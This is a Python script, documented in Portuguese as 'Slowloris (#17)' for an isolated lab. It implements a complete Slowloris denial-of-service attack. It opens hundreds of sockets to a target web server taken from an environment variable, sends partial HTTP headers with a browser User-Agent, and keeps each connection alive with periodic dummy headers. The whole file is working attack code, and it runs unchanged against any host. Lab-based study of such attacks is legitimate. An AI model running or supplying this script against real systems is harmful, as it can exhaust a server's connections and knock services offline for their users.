"""Slowloris (#17): mantem muitas conexoes abertas enviando cabecalhos parciais.

Implementacao minima para laboratorio isolado: abre ``--sockets`` conexoes com
o proxy, envia a linha de requisicao e alguns cabecalhos, e a cada
``--interval`` segundos envia mais um cabecalho ``X-a: n`` para que o servidor
nao encerre a conexao. Conexoes derrubadas sao recriadas.
"""
import argparse
import os
import random
import socket
import time
from urllib.parse import urlparse

TARGET = urlparse(os.getenv("TARGET", "http://nginx-proxy"))
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


def open_socket(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port), timeout=5)
    s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {host}\r\n".encode())
    s.send(f"User-Agent: {UA}\r\n".encode())
    s.send(b"Accept-language: en-US,en,q=0.5\r\n")
    return s


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sockets", type=int, default=900)
    ap.add_argument("--interval", type=float, default=10.0)
    args = ap.parse_args()
    host, port = TARGET.hostname, TARGET.port or 80
    socks: list[socket.socket] = []
    while True:
        while len(socks) < args.sockets:
            try:
                socks.append(open_socket(host, port))
            except OSError:
                break
        for s in list(socks):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except OSError:
                socks.remove(s)
                s.close()
        print(f"[slowloris] conexoes abertas: {len(socks)}", flush=True)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
